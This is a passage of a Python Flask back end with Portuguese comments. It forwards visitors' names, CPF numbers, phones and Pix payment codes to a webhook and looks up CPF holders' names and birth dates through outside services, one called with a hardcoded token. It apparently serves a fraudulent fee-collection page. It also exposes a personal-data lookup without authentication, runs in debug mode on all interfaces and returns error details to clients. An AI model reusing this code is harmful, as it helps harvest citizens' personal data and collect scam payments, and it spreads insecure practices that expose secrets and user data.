def webhook_pagamento():
    """Endpoint para enviar webhook quando usuário acessa a página de pagamento"""
    try:
        data = request.get_json()
        
        # Verificar se temos dados mínimos
        if not data or not data.get('nome') or not data.get('cpf'):
            app.logger.warning("[WEBHOOK] Dados insuficientes para envio de webhook")
            return jsonify({'status': 'error', 'message': 'Dados insuficientes'}), 400
        
        # Preparar dados do usuário para o webhook
        # Limpar telefone removendo todos os caracteres não numéricos
        telefone_clean = re.sub(r'\D', '', data.get('telefone', ''))
        
        user_data = {
            'nome': data.get('nome', ''),
            'cpf': data.get('cpf', ''),
            'telefone': telefone_clean,
            'email': data.get('email', f"{data.get('nome', '').lower().replace(' ', '')}@gmail.com"),
            'amount': data.get('amount', 83.40),
            'pixCode': data.get('pixCode', ''),
            'pixQrCode': data.get('pixQrCode', '')
        }
        
        # Enviar webhook
        send_webhook(user_data)
        app.logger.info(f"[WEBHOOK] Webhook enviado via endpoint dedicado para: {user_data['nome']} ({user_data['cpf']})")
        
        return jsonify({'status': 'success', 'message': 'Webhook enviado com sucesso'})
        
    except Exception as e:
        app.logger.error(f"[WEBHOOK] Erro ao processar webhook: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/consultar-cpf')
def consultar_cpf():
    """Busca informações de um CPF na API do webhook-manager (para a página de verificar-cpf)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    # URL da API especificada
    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?cpf={cpf}"
    
    try:
        # Fazer a solicitação para a API
        response = requests.get(api_url)
        data = response.json()
        
        # Verificar se a consulta foi bem-sucedida
        if data.get('sucesso') and 'cliente' in data:
            cliente = data['cliente']
            
            # Remover qualquer formatação do CPF
            cpf_sem_pontuacao = re.sub(r'[^\d]', '', cliente.get('cpf', ''))
            nome_completo = cliente.get('nome', '')
            telefone = cliente.get('telefone', '')
            
            # Em vez de retornar JSON, redirecionar para a página de agradecimento
            app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}. Redirecionando para página de agradecimento.")
            
            # Construir URL de redirecionamento com os parâmetros necessários
            redirect_url = f"/obrigado?nome={urllib.parse.quote(nome_completo)}&cpf={cpf_sem_pontuacao}&phone={urllib.parse.quote(telefone)}"
            return redirect(redirect_url)
        else:
            # Em caso de erro na API, ainda retornar JSON para que o front-end possa tratar
            return jsonify({"error": "CPF não encontrado ou inválido"}), 404
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na nova API (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # Usar a nova API para buscar os dados do CPF
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf_numerico}"
        
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            # Verificar se a consulta foi bem-sucedida
            if data.get("DADOS"):
                dados = data.get("DADOS")
                # Extrair informações relevantes
                nome = dados.get("nome", "")
                data_nascimento = dados.get("data_nascimento", "").split(" ")[0]  # Pegar apenas a data, remover a hora
                
                # Montar resposta no formato esperado pela aplicação
                user_data = {
                    'cpf': cpf,
                    'nome': nome,
                    'dataNascimento': data_nascimento,
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                app.logger.info(f"[PROD] CPF consultado com sucesso na nova API: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"Erro na consulta da nova API: dados não encontrados")
                return jsonify({"error": "CPF não encontrado na base de dados"}), 404
        else:
            app.logger.error(f"Erro de conexão com a nova API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}"}), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na nova API: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)